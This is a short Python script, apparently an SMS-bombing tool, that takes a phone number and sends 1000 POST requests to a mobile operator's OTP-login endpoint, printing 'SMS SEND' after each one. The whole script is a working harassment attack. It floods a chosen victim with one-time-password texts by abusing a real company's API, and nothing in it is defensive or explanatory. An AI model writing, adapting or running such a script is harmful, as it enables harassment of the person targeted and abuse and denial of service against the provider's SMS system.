import requests


number=str(input("Enter Your Number:"))

name="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
data={"mobile":number}



for i in range(1000):
	requests.post(name,data=data)
	print(str(i+1)+'SMS SEND')
